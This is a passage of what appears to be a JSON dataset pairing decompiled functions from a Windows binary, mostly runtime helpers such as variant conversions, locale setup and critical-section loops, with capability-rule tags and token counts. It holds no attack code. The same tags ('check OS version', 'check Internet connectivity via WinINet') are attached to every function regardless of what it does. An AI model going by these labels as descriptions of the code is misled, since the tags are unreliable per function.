uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    iVar1 = 8;\n    do {\n        var_4h = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    var_14h = 0x40d8a7;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0040d5dc::var_18h;\n    var_1ch = 0x40d5ff;\n    var_ch = unaff_EBX;\n    fcn.0040d518();\n    var_1ch = 0x40d604;\n    fcn.0040be98();\n    if (*0x4958d0 != '\\0') {\n        var_1ch = 0x40d612;\n        fcn.0040c070();\n    }\n    var_1ch = 0x40d617;\n    sub.kernel32.dll_GetThreadLocale_1();\n    var_1ch = &fcn.0040d5dc::var_10h;\n    var_20h = 0x40d62b;\n    fcn.0040bde4(var_1ch);\n    var_20h = 0x40d638;\n    fcn.00404df4();\n    var_20h = &fcn.0040d5dc::var_14h;\n    var_24h = 0x40d64d;\n    fcn.0040bde4(var_20h);\n    var_24h = 0x40d657;\n    *0x495808 = fcn.00408f00();\n    var_24h = &fcn.0040d5dc::var_18h;\n    var_28h = 0x40d671;\n    fcn.0040bde4(var_24h);\n    var_28h = 0x40d67b;\n    *0x495809 = fcn.00408f00();\n    var_28h = 0x40d68e;\n    *0x49580a = fcn.0040be30();\n    var_28h = 0x40d6a1;\n    *0x49580b = fcn.0040be30();\n    var_28h = &fcn.0040d5dc::var_1ch;\n    var_2ch = 0x40d6bb;\n    fcn.0040bde4(var_28h);\n    var_2ch = 0x40d6c5;\n    *0x49580c = fcn.00408f00();\n    var_2ch = 0x40d6d8;\n    *0x49580d = fcn.0040be30();\n    var_2ch = &fcn.0040d5dc::var_24h;\n    var_30h = 0x40d6f2;\n    fcn.0040bde4(var_2ch);\n    var_30h = 0x40d6fd;\n    fcn.0040c120();\n    var_30h = 0x40d70a;\n    fcn.00404df4();\n    var_30h = &fcn.0040d5dc::var_2ch;\n    var_34h = 0x40d71f;\n    fcn.0040bde4(var_30h);\n    var_34h = 0x40d72a;\n    fcn.0040c120();\n    var_34h = 0x40d737;\n    fcn.00404df4();\n    var_34h = 0x40d745;\n    *0x495818 = fcn.0040be30();\n    var_34h = &fcn.0040d5dc::var_30h;\n    var_38h = 0x40d75f;\n    fcn.0040bde4(var_34h);\n    var_38h = 0x40d76c;\n    fcn.00404df4();\n    var_38h = &fcn.0040d5dc::var_34h;\n    var_3ch = 0x40d781;\n    fcn.0040bde4(var_38h);\n    var_3ch = 0x40d78e;\n    fcn.00404df4();\n    var_3ch = 0x40d796;\n    fcn.00404da0();\n    var_3ch = 0x40d79e;\n    fcn.00404da0();\n    var_3ch = &fcn.0040d5dc::var_38h;\n    var_40h = 0x40d7b3;\n    fcn.0040bde4(var_3ch);\n    var_40h = 0x40d7bd;\n    iVar1 = fcn.00408f00();\n    if (iVar1 == 0) {\n        var_40h = 0x40d7ce;\n        fcn.00404e38();\n    }\n    else {\n        var_40h = 0x40d7dd;\n        fcn.00404e38();\n    }\n    var_40h = &fcn.0040d5dc::var_3ch;\n    fcn.0040bde4(var_40h);\n    iVar1 = fcn.00408f00();\n    if (iVar1 == 0) {\n        fcn.0040bde4(&fcn.0040d5dc::var_40h);\n        iVar1 = fcn.00408f00();\n        if (iVar1 == 0) {\n            fcn.00404e38();\n        }\n        else {\n            fcn.00404e38();\n        }\n    }\n    fcn.00405124(var_ch, 0x40d940, var_4h, var_8h);\n    fcn.00405124(var_ch, 0x40d94c, var_4h, var_8h);\n    *0x4958d2 = fcn.0040be30();\n    *in_FS_OFFSET = var_ch;\n    fcn.00404dc4(0x40d8ae);\n    return;\n}\n",
        "token_count": 1705
    },
    "0040dc5c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040dc5c(void)\n\n{\n    while( true ) {\n        if (*0x490a18 == NULL) break;\n        *0x490a18 = **0x490a18;\n        fcn.00402d00();\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "0040dc80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040dc80(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x40dcb8);\n    if (iVar1 != 0) {\n        *0x490840 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x40dcc8);\n    }\n    if (*0x490840 == NULL) {\n        *0x490840 = fcn.004094d8;\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "0040e950": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040e950(uint arg_8h, int32_t arg_ch, uint noname_2, int16_t *arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack20 = &fcn.0040e950::var_1h + 1;\n    uStack24 = 0x40e9bd;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (arg_ch == 0x400) {\n        fcn.00405028();\n        fcn.0040904c();\n        *arg_14h = -(var_1h != '\\0');\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x40e9c4;\n    uStack24 = 0x40e9bc;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 260
    },
    "0040eab4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040eab4(uint arg_8h, int32_t arg_ch, uint noname_2, uint *arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (arg_14h != NULL) {\n        *arg_14h = 0;\n    }\n    uStack20 = 0x40eb18;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004090e8();\n        fcn.004056d0();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40eb1f;\n    uStack20 = 0x40eb17;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 221
    },
    "0040eb48": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040eb48(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EDX;\n    \n    iVar1 = in_EDX;\n    if (*(arg_8h + -4) != 0) {\n        iVar1 = sub.kernel32.dll_GetProcAddress_1(*(arg_8h + -4));\n        if (iVar1 == 0) {\n            iVar1 = in_EDX;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 111
    },
    "00410210": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00410210(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint *puStack40;\n    uint pvarg;\n    uint var_14h;\n    int32_t *var_ch;\n    char var_5h;\n    uint *var_4h;\n    \n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    puStack40 = 0x410232;\n    var_4h = param_2;\n    var_5h = fcn.0041161c();\n    if (var_5h != '\\0') {\n        puStack40 = &fcn.00410210::pvarg;\n        puStack44 = 0x410244;\n        sub.oleaut32.dll_VariantInit();\n        uStack48 = 0x410285;\n        uStack52 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffcc;\n        puStack44 = &stack0xfffffffc;\n        (**(*var_ch + 0x1c))();\n        fcn.00404df4();\n        *in_FS_OFFSET = 0x100;\n        uStack48 = 0x41028c;\n        uStack52 = 0x410284;\n        uVar1 = fcn.0040fc3c();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 330
    },
    "00410298": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00410298(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint *in_FS_OFFSET;\n    float10 fVar3;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_ch = 0xe;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x4107c4;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00410298::var_20h;\n    uVar1 = *param_2;\n    // switch table (21 cases) at 0x4102d2\n    switch(uVar1) {\n    case 0:\n        var_18h = &stack0xfffffffc;\n        fcn.00404da0();\n        break;\n    case 1:\n        var_18h = &stack0xfffffffc;\n        if (*0x490a24 != '\\0') {\n            var_18h = &stack0xfffffffc;\n            fcn.0040f4dc();\n        }\n        fcn.00404df4();\n        break;\n    case 2:\n        var_18h = &stack0xfffffffc;\n        fcn.00408d88();\n        fcn.00404df4();\n        break;\n    case 3:\n        var_18h = &stack0xfffffffc;\n        fcn.00408d88();\n        fcn.00404df4();\n        break;\n    case 4:\n        fVar3 = *(param_2 + 4);\n        var_2ch = SUB104(fVar3, 0);\n        var_28h = fVar3 >> 0x20;\n        var_24h._0_1_ = fVar3 >> 0x40;\n        var_18h = &stack0xfffffffc;\n        fcn.0040a3c8(var_2ch);\n        fcn.00404df4(var_2ch, var_28h, var_24h);\n        break;\n    case 5:\n        fVar3 = *(param_2 + 4);\n        var_2ch = SUB104(fVar3, 0);\n        var_28h = fVar3 >> 0x20;\n        var_24h._0_1_ = fVar3 >> 0x40;\n        var_18h = &stack0xfffffffc;\n        fcn.0040a3c8(var_2ch);\n        fcn.00404df4(var_2ch, var_28h, var_24h);\n        break;\n    case 6:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.0040ffa8(var_28h, *(param_2 + 6));\n        fcn.00405028();\n        break;\n    case 7:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.0040ffe0(var_28h, *(param_2 + 6));\n        fcn.00405028();\n        break;\n    case 8:\n        var_18h = &stack0xfffffffc;\n        fcn.00405780(&fcn.00410298::var_1ch);\n        var_28h = 0x41042b;\n        fcn.00405028();\n        break;\n    case 9:\n    case 0xd:\n        var_18h = &stack0xfffffffc;\n        fcn.004100e0();\n        fcn.00404df4();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            var_18h = &stack0xfffffffc;\n            fcn.00404df4();\n        }\n        else if (uVar1 == 0x101) {\n            var_18h = &stack0xfffffffc;\n            fcn.004101ac();\n            fcn.00404df4();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            var_18h = &stack0xfffffffc;\n            fcn.00404da0();\n            cVar2 = fcn.00410210();\n            if (cVar2 == '\\0') {\n                fcn.004100e0();\n                fcn.00404df4();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x41055a\n            switch(uVar1 & 0xbfff) {\n            default:\n                var_18h = &stack0xfffffffc;\n                fcn.004100e0();\n                fcn.00404df4();\n                break;\n            case 2:\n                var_18h = &stack0xfffffffc;\n                fcn.00408d88();\n                fcn.00404df4();\n                break;\n            case 3:\n                var_18h = &stack0xfffffffc;\n                fcn.00408d88();\n                fcn.00404df4();\n                break;\n            case 4:\n                fVar3 = **(param_2 + 4);\n                var_2ch = SUB104(fVar3, 0);\n                var_28h = fVar3 >> 0x20;\n                var_24h._0_1_ = fVar3 >> 0x40;\n                var_18h = &stack0xfffffffc;\n                fcn.0040a3c8(var_2ch);\n                fcn.00404df4(var_2ch, var_28h, var_24h);\n                break;\n            case 5:\n                fVar3 = **(param_2 + 4);\n                var_2ch = SUB104(fVar3, 0);\n                var_28h = fVar3 >> 0x20;\n                var_24h._0_1_ = fVar3 >> 0x40;\n                var_18h = &stack0xfffffffc;\n                fcn.0040a3c8(var_2ch);\n                fcn.00404df4(var_2ch, var_28h, var_24h);\n                break;\n            case 6:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.0040ffa8(var_28h, (*(param_2 + 4))[1]);\n                fcn.00405028();\n                break;\n            case 7:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.0040ffe0(var_28h, (*(param_2 + 4))[1]);\n                fcn.00405028();\n                break;\n            case 8:\n                var_18h = &stack0xfffffffc;\n                fcn.00404fc8();\n                break;\n            case 0xb:\n                var_18h = &stack0xfffffffc;\n                fcn.00410018();\n                fcn.00405028();\n                break;\n            case 0xc:\n                var_18h = &stack0xfffffffc;\n                fcn.00410298();\n                break;\n            case 0x10:\n                var_18h = &stack0xfffffffc;\n                fcn.00408d88();\n                fcn.00404df4();\n                break;\n            case 0x11:\n                var_18h = &stack0xfffffffc;\n                fcn.00408d88();\n                fcn.00404df4();\n                break;\n            case 0x12:\n                var_18h = &stack0xfffffffc;\n                fcn.00408d88();\n                fcn.00404df4();\n                break;\n            case 0x13:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00408e74(var_28h);\n                fcn.00404df4(var_28h, 0);\n                break;\n            case 0x14:\n                var_24h._0_1_ = (*(param_2 + 4))[1];\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00408e74(var_28h);\n                fcn.00404df4(var_28h, var_24h);\n            }\n        }\n        break;\n    case 0xb:\n        var_18h = &stack0xfffffffc;\n        fcn.00410018();\n        fcn.00405028();\n        break;\n    case 0xc:\n        var_18h = &stack0xfffffffc;\n        fcn.00410298();\n        break;\n    case 0x10:\n        var_18h = &stack0xfffffffc;\n        fcn.00408d88();\n        fcn.00404df4();\n        break;\n    case 0x11:\n        var_18h = &stack0xfffffffc;\n        fcn.00408d88();\n        fcn.00404df4();\n        break;\n    case 0x12:\n        var_18h = &stack0xfffffffc;\n        fcn.00408d88();\n        fcn.00404df4();\n        break;\n    case 0x13:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.00408e74(var_28h);\n        fcn.00404df4(var_28h, 0);\n        break;\n    case 0x14:\n        var_24h._0_1_ = *(param_2 + 6);\n        var_28h = *(param_2 + 4);\n        fcn.00408e74(var_28h);\n        fcn.00404df4(var_28h, var_24h);\n    }\n    *in_FS_OFFSET = var_28h;\n    var_20h = 0x4107cb;\n    fcn.00404dc4();\n    fcn.00405598();\n    fcn.00404dc4();\n    fcn.00405598();\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 2576
    },
    "004108f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004108f0(uint param_1, uint *param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint pvarg;\n    uint var_14h;\n    int32_t *var_ch;\n    char var_5h;\n    uint *var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    uStack48 = 0x4109a8;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x410925;\n    var_4h = param_2;\n    var_5h = fcn.0041161c();\n    if (var_5h != '\\0') {\n        puStack56 = &fcn.004108f0::pvarg;\n        puStack60 = 0x410937;\n        sub.oleaut32.dll_VariantInit();\n        uStack64 = 0x41098b;\n        uStack68 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffbc;\n        puStack60 = &stack0xfffffffc;\n        (**(*var_ch + 0x1c))(8);\n        arg_8h = var_4h;\n        fcn.00405694();\n        fcn.00405780(arg_8h);\n        *in_FS_OFFSET = arg_8h;\n        uStack68 = 0x410992;\n        fcn.0040fc3c();\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x4109af;\n    uStack48 = 0x4109a7;\n    fcn.00405580();\n    return;\n}\n",
        "token_count": 452
    },
    "004109b8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004109b8(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    float10 fVar4;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    iVar3 = 0xe;\n    do {\n        var_4h = 0;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_18h = 0x410efd;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004109b8::var_1ch;\n    uVar1 = *param_2;\n    // switch table (21 cases) at 0x4109f1\n    switch(uVar1) {\n    case 0:\n        var_14h = &stack0xfffffffc;\n        fcn.00405580();\n        break;\n    case 1:\n        var_14h = &stack0xfffffffc;\n        if (*0x490a24 != '\\0') {\n            var_14h = &stack0xfffffffc;\n            fcn.0040f4dc();\n        }\n        fcn.004056d0();\n        break;\n    case 2:\n        var_14h = &stack0xfffffffc;\n        fcn.00408d88();\n        fcn.004056d0();\n        break;\n    case 3:\n        var_14h = &stack0xfffffffc;\n        fcn.00408d88();\n        fcn.004056d0();\n        break;\n    case 4:\n        fVar4 = *(param_2 + 4);\n        var_28h = SUB104(fVar4, 0);\n        var_24h = fVar4 >> 0x20;\n        var_20h._0_1_ = fVar4 >> 0x40;\n        var_14h = &stack0xfffffffc;\n        fcn.0040a3c8(var_28h);\n        fcn.004056d0(var_28h, var_24h, var_20h);\n        break;\n    case 5:\n        fVar4 = *(param_2 + 4);\n        var_28h = SUB104(fVar4, 0);\n        var_24h = fVar4 >> 0x20;\n        var_20h._0_1_ = fVar4 >> 0x40;\n        var_14h = &stack0xfffffffc;\n        fcn.0040a3c8(var_28h);\n        fcn.004056d0(var_28h, var_24h, var_20h);\n        break;\n    case 6:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.0040ffa8(var_24h, *(param_2 + 6));\n        fcn.004055bc();\n        break;\n    case 7:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.0040ffe0(var_24h, *(param_2 + 6));\n        fcn.004055bc();\n        break;\n    case 8:\n        var_24h = 0x410b3d;\n        var_14h = &stack0xfffffffc;\n        fcn.00405780(in_EAX);\n        break;\n    case 9:\n    case 0xd:\n        var_14h = &stack0xfffffffc;\n        fcn.004107d4();\n        fcn.004055bc();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            var_14h = &stack0xfffffffc;\n            fcn.004056d0();\n        }\n        else if (uVar1 == 0x101) {\n            var_14h = &stack0xfffffffc;\n            fcn.0041088c();\n            fcn.004055bc();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            var_14h = &stack0xfffffffc;\n            fcn.00405580();\n            cVar2 = fcn.004108f0();\n            if (cVar2 == '\\0') {\n                fcn.004107d4();\n                fcn.004055bc();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x410c6c\n            switch(uVar1 & 0xbfff) {\n            default:\n                var_14h = &stack0xfffffffc;\n                fcn.004107d4();\n                fcn.004055bc();\n                break;\n            case 2:\n                var_14h = &stack0xfffffffc;\n                fcn.00408d88();\n                fcn.004056d0();\n                break;\n            case 3:\n                var_14h = &stack0xfffffffc;\n                fcn.00408d88();\n                fcn.004056d0();\n                break;\n            case 4:\n                fVar4 = **(param_2 + 4);\n                var_28h = SUB104(fVar4, 0);\n                var_24h = fVar4 >> 0x20;\n                var_20h._0_1_ = fVar4 >> 0x40;\n                var_14h = &stack0xfffffffc;\n                fcn.0040a3c8(var_28h);\n                fcn.004056d0(var_28h, var_24h, var_20h);\n                break;\n            case 5:\n                fVar4 = **(param_2 + 4);\n                var_28h = SUB104(fVar4, 0);\n                var_24h = fVar4 >> 0x20;\n                var_20h._0_1_ = fVar4 >> 0x40;\n                var_14h = &stack0xfffffffc;\n                fcn.0040a3c8(var_28h);\n                fcn.004056d0(var_28h, var_24h, var_20h);\n                break;\n            case 6:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.0040ffa8(var_24h, (*(param_2 + 4))[1]);\n                fcn.004055bc();\n                break;\n            case 7:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.0040ffe0(var_24h, (*(param_2 + 4))[1]);\n                fcn.004055bc();\n                break;\n            case 8:\n                var_14h = &stack0xfffffffc;\n                fcn.00405694();\n                break;\n            case 0xb:\n                var_14h = &stack0xfffffffc;\n                fcn.00410018();\n                fcn.004055bc();\n                break;\n            case 0xc:\n                var_14h = &stack0xfffffffc;\n                fcn.004109b8();\n                break;\n            case 0x10:\n                var_14h = &stack0xfffffffc;\n                fcn.00408d88();\n                fcn.004056d0();\n                break;\n            case 0x11:\n                var_14h = &stack0xfffffffc;\n                fcn.00408d88();\n                fcn.004056d0();\n                break;\n            case 0x12:\n                var_14h = &stack0xfffffffc;\n                fcn.00408d88();\n                fcn.004056d0();\n                break;\n            case 0x13:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00408e74(var_24h);\n                fcn.004056d0(var_24h, 0);\n                break;\n            case 0x14:\n                var_20h._0_1_ = (*(param_2 + 4))[1];\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00408e74(var_24h);\n                fcn.004056d0(var_24h, var_20h);\n            }\n        }\n        break;\n    case 0xb:\n        var_14h = &stack0xfffffffc;\n        fcn.00410018();\n        fcn.004055bc();\n        break;\n    case 0xc:\n        var_14h = &stack0xfffffffc;\n        fcn.004109b8();\n        break;\n    case 0x10:\n        var_14h = &stack0xfffffffc;\n        fcn.00408d88();\n        fcn.004056d0();\n        break;\n    case 0x11:\n        var_14h = &stack0xfffffffc;\n        fcn.00408d88();\n        fcn.004056d0();\n        break;\n    case 0x12:\n        var_14h = &stack0xfffffffc;\n        fcn.00408d88();\n        fcn.004056d0();\n        break;\n    case 0x13:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.00408e74(var_24h);\n        fcn.004056d0(var_24h, 0);\n        break;\n    case 0x14:\n        var_20h._0_1_ = *(param_2 + 6);\n        var_24h = *(param_2 + 4);\n        fcn.00408e74(var_24h);\n        fcn.004056d0(var_24h, var_20h);\n    }\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x410f04;\n    fcn.00405598();\n    fcn.00404dc4();\n    fcn.00405598();\n    fcn.00404dc4();\n    fcn.00405598();\n    fcn.00404dc4();\n    fcn.00405598();\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 2586
    },
    "00410f0c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410f0c(char param_1, uint param_2)\n\n{\n    uint16_t *in_EAX;\n    \n    if ((*in_EAX & 0xbfe8) != 0) {\n        fcn.0040fbc0();\n    }\n    if (*0x490a2c == '\\0') {\n        *in_EAX = 3;\n    }\n    else {\n        *in_EAX = *(param_1 * 2 + 0x490a40);\n    }\n    *(in_EAX + 4) = param_2;\n    return;\n}\n",
        "token_count": 132
    },
    "00410f74": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410f74(uint param_1, char param_2)\n\n{\n    uint16_t *in_EAX;\n    \n    if ((*in_EAX & 0xbfe8) != 0) {\n        fcn.0040fbc0();\n    }\n    *in_EAX = 0xb;\n    in_EAX[4] = -(param_2 != '\\0');\n    return;\n}\n",
        "token_count": 92
    },
    "00411378": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00411378(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    \n    uStack16 = 0x4962a8;\n    puStack20 = 0x41138c;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack24 = 0x4113d9;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    iVar1 = fcn.00405c9c();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            if (*(*0x4962a4 + iVar1 * 4) != *0x490a34) {\n                fcn.00403f58();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4113e0;\n    uStack24 = 0x4962a8;\n    uStack28 = 0x4113d8;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 287
    },
    "0041161c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
